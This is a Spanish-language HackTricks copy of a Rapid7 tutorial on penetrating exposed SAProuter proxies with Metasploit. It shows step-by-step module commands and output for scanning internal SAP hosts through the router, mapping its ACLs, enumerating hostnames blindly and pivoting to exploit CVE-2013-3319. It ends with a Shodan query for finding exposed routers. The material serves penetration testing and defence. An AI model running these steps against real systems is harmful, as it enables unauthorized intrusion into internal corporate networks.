<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue**me en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


Copia de: [https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/](https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/)
```text
PORT     STATE SERVICE    VERSION
3299/tcp open  saprouter?
```
# Atravesando SAProuter con Metasploit

SAProuter es b√°sicamente un proxy inverso para sistemas SAP, que generalmente se encuentra entre Internet y los sistemas SAP internos. Su principal prop√≥sito es permitir el acceso controlado desde hosts en Internet a los sistemas SAP internos, ya que permite un control m√°s detallado de los protocolos SAP que un firewall t√≠pico.

Esto significa que SAProuter usualmente termina estando expuesto a Internet, al permitir el puerto TCP entrante 3299 al host de SAProuter en los firewalls de la organizaci√≥n. Y desde el SAProuter, al menos deber√≠a ser posible alcanzar un servidor SAP interno. Esto lo convierte en un objetivo muy interesante, ya que puede proporcionar una v√≠a de acceso a la red de "alto valor".

La siguiente figura muestra una configuraci√≥n de red b√°sica, que utilizaremos para los ejemplos:

![](https://blog.rapid7.com/content/images/post-images/33923/image1.jpg)

Primero comenzaremos realizando un escaneo de servicio SAP de la direcci√≥n IP expuesta, utilizando el m√≥dulo [`sap_service_discovery`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery), en este caso, 1.2.3.101.
```text
msf> use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_service_discovery) > run

[*] [SAP] Beginning service Discovery '1.2.3.101'

[+] 1.2.3.101:3299      - SAP Router OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
El escaneo nos muestra que el host est√° ejecutando un SAP router en el puerto TCP 3299 esperado. Ahora podemos profundizar e intentar obtener informaci√≥n del saprouter. Si ha sido configurado incorrectamente, y a menudo lo est√°, podr√≠a ser posible obtener informaci√≥n interna, como las conexiones establecidas a trav√©s del saprouter con hosts internos. Para este prop√≥sito utilizamos el m√≥dulo [`sap_router_info_request`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request):
```text
msf auxiliary(sap_router_info_request) > use auxiliary/scanner/sap/sap_router_info_request
msf auxiliary(sap_router_info_request) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_router_info_request) > run

[+] 1.2.3.101:3299 - Connected to saprouter
[+] 1.2.3.101:3299 - Sending ROUTER_ADM packet info request
[+] 1.2.3.101:3299 - Got INFO response
[+] Working directory   : /opt/sap
[+] Routtab             : ./saprouttab

[SAP] SAProuter Connection Table for 1.2.3.101
===================================================

Source        Destination   Service
------        -----------   -------
1.2.3.12      192.168.1.18  3200


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
**Enumeraci√≥n de hosts y servicios internos**

Con esta informaci√≥n, ahora podemos comenzar a escanear la red interna. Dado que saprouter funciona como un proxy, intentaremos conectarnos a √©l y solicitar conexiones a hosts y puertos internos, y ver las respuestas de saprouter. Esto puede proporcionar m√°s informaci√≥n sobre los hosts internos, servicios y ACLs, dependiendo de la configuraci√≥n del saprouter. Utilizaremos el m√≥dulo [`sap_router_portscanner`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner) para este prop√≥sito.

El m√≥dulo se conecta al saprouter y solicita conexiones a otros hosts \(definidos en la opci√≥n TARGETS\) en puertos TCP espec√≠ficos. Luego analiza las respuestas y determina si la conexi√≥n solicitada es posible o no. Este m√≥dulo proporciona algunas opciones que se pueden utilizar:
```text
Basic options:
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-99            no        SAP instance numbers to scan (NN in PORTS definition)
MODE         SAP_PROTO        yes       Connection Mode: SAP_PROTO or TCP  (accepted: SAP_PROTO, TCP)
PORTS        32NN             yes       Ports to scan (e.g. 3200-3299,5NN13)
RESOLVE      local            yes       Where to resolve TARGETS (accepted: remote, local)
RHOST                         yes       SAPRouter address
RPORT        3299             yes       SAPRouter TCP port
TARGETS                       yes       Comma delimited targets. When resolution is local address ranges or CIDR identifiers allowed.
```
Al menos deber√°s establecer la direcci√≥n IP del saprouter, en el caso del ejemplo, 1.2.3.101. Luego, configura TARGETS con las direcciones de la red interna que te gustar√≠a escanear, y finalmente establece PORTS con los puertos TCP a escanear.

El m√≥dulo tambi√©n proporciona una opci√≥n INSTANCES que permite simplificar la definici√≥n de la opci√≥n PORTS. Las instalaciones de SAP admiten m√∫ltiples instancias, proporcionando servicios similares, por lo que a cada instancia se le asignan puertos TCP. Por ejemplo, la instancia SAP 00 tendr√° el servicio de despachador SAP \(donde se conecta SAP GUI\) en el puerto 3200 y la instancia 01 en el puerto 3201. La opci√≥n PORTS admite un "comod√≠n" que es "NN" que se reemplazar√° con el n√∫mero de instancia, por lo tanto, escaneando puertos para todas las instancias definidas. Entonces, si queremos escanear instancias del 00 al 50, podemos definir las variables INSTANCES y PORTS de esta manera:
```text
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-50
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
```
Con esta configuraci√≥n, el m√≥dulo escanear√° los puertos en el rango de 3200 a 3250.

En el c√≥digo fuente del m√≥dulo tienes informaci√≥n sobre los puertos predeterminados comunes en sistemas SAP, que ahora utilizaremos para el escaneo:
```text
msf > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > set RHOST 1.2.3.101
RHOST => 1.2.3.101
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.18
TARGETS => 192.168.1.18
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
PORTS => 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host           Port   State   Info
----           ----   -----   ----
192.168.1.18   3201   closed  SAP Dispatcher sapdp01
192.168.1.18   3200   open    SAP Dispatcher sapdp00
192.168.1.18   50013  open    SAP StartService [SOAP] sapctrl00

[*] Auxiliary module execution completed
```
Podemos intentar entender por qu√© algunas conexiones no est√°n permitidas a trav√©s del saprouter utilizando la opci√≥n VERBOSE. Cuando VERBOSE est√° configurado en true, podemos ver la respuesta del saprouter y mapear la ACL definida.

Ahora escanearemos los hosts 192.168.1.18 y 192.168.1.1, pero solo en el puerto 3200, para ver si podemos conectarnos a ambos despachadores SAP:
```text
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.1,192.168.1.18
TARGETS => 192.168.1.1,192.168.1.18
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State   Info
----          ----  -----   ----
192.168.1.18  3200  open  SAP Dispatcher sapdp00

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[!] Warning: Service info could be inaccurate
[*] Auxiliary module execution completed
```
Como puede ver, ahora tambi√©n sabemos que no podemos conectarnos a otro host en el puerto 3200, ya que est√° bloqueado por la ACL definida en el saprouter.

**Mapeando las ACLs**

Un aspecto interesante del saprouter es que admite dos tipos de conexiones:

* Nativa ‚Äì Estas conexiones son simplemente conexiones TCP;
* Protocolo SAP ‚Äì Estas son conexiones TCP con un giro, el protocolo establece que todos los mensajes comienzan con 4 bytes que indican la longitud del contenido siguiente.

El protocolo SAP es espec√≠fico para saprouter y es lo que SAP GUI utiliza para conectarse al puerto SAP DIAG a trav√©s del saprouter. El protocolo nativo se utiliza para permitir que otros tipos de conexiones pasen a trav√©s del saprouter.

Este m√≥dulo permite especificar qu√© tipo de conexi√≥n probar durante el escaneo en la opci√≥n MODE. El valor predeterminado es el protocolo SAP, que es el m√°s probable de ser utilizado en producci√≥n. Sin embargo, no es raro encontrar otros servicios permitidos a trav√©s del saprouter, donde la ACL permitir√° conexiones nativas \(TCP\) a trav√©s.

Podemos establecer el MODE en TCP para evaluar si este tipo de conexiones est√°n permitidas. Ahora escanearemos los hosts internos, tanto en el puerto 3200 \(SAP DIAG\) como en el 80 \(HTTP\), con VERBOSE establecido en true, en ambas instancias 00 y 01 y veremos qu√© sucede:
```text
msf auxiliary(sap_router_portscanner) > set MODE TCP
MODE => TCP

msf auxiliary(sap_router_portscanner) > set PORTS 80,32NN
PORTS => 80,32NN
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:80 - TCP OPEN
[-] 192.168.1.18:3200 - blocked by ACL
[+] 192.168.1.18:3201 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State  Info
----          ----  -----  ----
192.168.1.18  80    open
192.168.1.18  3201  open   SAP Dispatcher sapdp01

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[+] 192.168.1.1:3201 - TCP OPEN
[+] 192.168.1.1:80 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host         Port  State  Info
----         ----  -----  ----
192.168.1.1  3201  open   SAP Dispatcher sapdp01
192.168.1.1  80    open

[*] Auxiliary module execution completed
```
Del resultado y la informaci√≥n previa, ahora sabemos que la ACL es algo as√≠:

* Permitir conexiones TCP de cualquier host a 192.168.1.1 al puerto 80
* Permitir conexiones TCP de cualquier host a 192.168.1.18 al puerto 80
* Permitir conexiones TCP de cualquier host a 192.168.1.1 al puerto 3201
* Permitir conexiones TCP de cualquier host a 192.168.1.18 al puerto 3201
* Permitir conexiones SAP de cualquier host a 192.168.1.18 al puerto 3200

**Enumeraci√≥n ciega de hosts internos**

Si recuerdas, comenzamos obteniendo informaci√≥n del saprouter que nos permiti√≥ conocer la direcci√≥n IP de un host interno, y a partir de ah√≠ continuamos. Pero, ¬øqu√© pasa si el saprouter no nos proporciona esa informaci√≥n?

Una opci√≥n es simplemente comenzar a escanear espacios de direcciones privadas y ver qu√© sucede. La otra es enumerar ciegamente los hosts por nombre de host.

Los saprouters son capaces de resolver nombres de host que les solicitamos conectar. El saprouter tambi√©n es lo suficientemente amable para hacernos saber cu√°les son los errores cuando falla en conectar \(puedes ver las respuestas crudas descomentando la l√≠nea 242 en el c√≥digo fuente del m√≥dulo\).

Con esta caracter√≠stica, somos capaces de enumerar hosts internos por nombre de host, ¬°e intentar ir directamente a lo m√°s valioso!

Para esto, necesitamos configurar la opci√≥n RESOLVE a "remote". En este caso, el m√≥dulo solicitar√° conexi√≥n a los TARGETS definidos, sin resolverlos localmente, y podemos intentar adivinar los hosts internos, y eventualmente conectar a ellos sin conocer nunca sus direcciones IP.

Cosas importantes para recordar al enumerar ciegamente hosts:

* Configurar VERBOSE en true;
* Obtendremos m√°s informaci√≥n del saprouter si MODE est√° configurado en SAP_PROTO;
* Es suficiente configurar solo un puerto para escanear, ya que en este punto solo nos interesa la informaci√≥n enviada por el saprouter \(prueba con 3200\);
* Los resultados variar√°n dependiendo de la ACL configurada. Desafortunadamente, las conexiones bloqueadas no nos dar√°n mucha informaci√≥n.

En este ejemplo intentaremos con los nombres de host sap, sapsrv y sapsrv2.
```text
msf auxiliary(sap_router_portscanner) > set RESOLVE remote
RESOLVE => remote
msf auxiliary(sap_router_portscanner) > set MODE SAP_PROTO
MODE => SAP_PROTO
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS sap,sapsrv,sapsrv2
TARGETS => sap,sapsrv,sapsrv2
msf auxiliary(sap_router_portscanner) > set PORTS 3200
PORTS => 3200
msf auxiliary(sap_router_portscanner) > run

[*] Scanning sap
[-] sap:3200 - unknown host
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv
[-] sapsrv:3200 - host unreachable
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv2
[+] sapsrv2:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host     Port  State  Info
----     ----  -----  ----
sapsrv2  3200  open   SAP Dispatcher sapdp00

[*] Auxiliary module execution completed
```
Del resultado observamos que el host "sap" no existe, pero el host sapsrv s√≠, aunque es inaccesible, y sapsrv2 existe y podemos conectarnos al puerto 3200.

Esta t√©cnica tambi√©n se puede utilizar para intentar encontrar otros hosts en la red, no relacionados con SAP, simplemente intenta usar nombres de host comunes, como smtp, exchange, pdc, bdc, fileshare, intranet, o cualquier otro nombre de host interesante que puedas tener en tu bolsa de trucos.

**La √∫ltima milla**

Ahora que hemos obtenido toda esta informaci√≥n, conocemos los hosts internos disponibles, qu√© servicios est√°n permitidos y qu√© protocolos podemos usar para atravesar el saprouter, podemos conectarnos realmente a servidores internos y proceder con nuestro pentest.

Metasploit nos proporciona una forma impresionante de usar saprouter como un proxy, utilizando la opci√≥n Proxies, gracias a Dave Hartley ([@nmonkee](http://twitter.com/nmonkee)).

As√≠ que en este punto, queremos comenzar a recopilar informaci√≥n sobre el servidor sap interno que hemos descubierto en el host 192.168.1.18. Como ejemplo, utilizaremos el m√≥dulo [`sap_hostctrl_getcomputersystem`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem) que explota CVE-2013-3319 y nos da detalles sobre el sistema operativo en el que se ejecuta el servidor consultando el servicio SAP Host Control en el puerto 1128 a trav√©s de una solicitud SOAP no autenticada. Estaremos pivotando a trav√©s del saprouter, utilizando el soporte de proxy en metasploit:

![](https://blog.rapid7.com/content/images/post-images/33923/image2.jpg)
```text
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem
msf auxiliary(sap_hostctrl_getcomputersystem) > set Proxies sapni:1.2.3.101:3299
Proxies => sapni:1.2.3.101:3299
msf auxiliary(sap_hostctrl_getcomputersystem) > set RHOSTS 192.168.1.18
RHOSTS => 192.168.1.18
msf auxiliary(sap_hostctrl_getcomputersystem) > run

[+] 192.168.1.18:1128 - Information retrieved successfully
[*] 192.168.1.18:1128 - Response stored in /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_386124.xml (XML) and /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_186948.txt (TXT)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Si todo sali√≥ bien, tendr√°s una buena salida del m√≥dulo en el bot√≠n que contiene informaci√≥n interna interesante del host SAP objetivo \(como nombres de usuario internos que luego puedes intentar forzar bruscamente\).

El pivoteo puede \(¬°y deber√≠a!\) usarse para ejecutar otros m√≥dulos contra hosts internos, ¬°no solo sistemas SAP!

**Conclusi√≥n**

Hemos visto c√≥mo es posible explotar configuraciones d√©biles de saprouter que pueden permitir el acceso a hosts internos desde Internet, todo esto utilizando solo el soporte de metasploit para pentesting de sistemas SAP.

Espero que este art√≠culo pueda ayudar a arrojar luz sobre los riesgos asociados con las implementaciones de saprouter, as√≠ como sobre la seguridad de SAP en general.

**Referencias**

* [http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/](http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/)
* \[[http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nun ez Di Croce - SAProuter .pdf\]\([http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nunez Di Croce - SAProuter .pdf\)
* [http://scn.sap.com/docs/DOC-17124](http://scn.sap.com/docs/DOC-17124)
* [http://help.sap.com/saphelp\_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/f rameset.htm](http://help.sap.com/saphelp_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/frameset.htm)
* [http://help.sap.com/saphelp\_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767 /content.htm](http://help.sap.com/saphelp_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767/content.htm)
* [http://labs.integrity.pt/advisories/cve-2013-3319/](http://labs.integrity.pt/advisories/cve-2013-3319/)
* [SAP Service Discovery \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery)
* [SAPRouter Admin Request \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request)
* [CVE-2013-3319 SAP Host Agent Information Disclosure \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem)
* [SAPRouter Port Scanner \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner)

# Shodan

* `port:3299 !HTTP Network packet too big`



<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
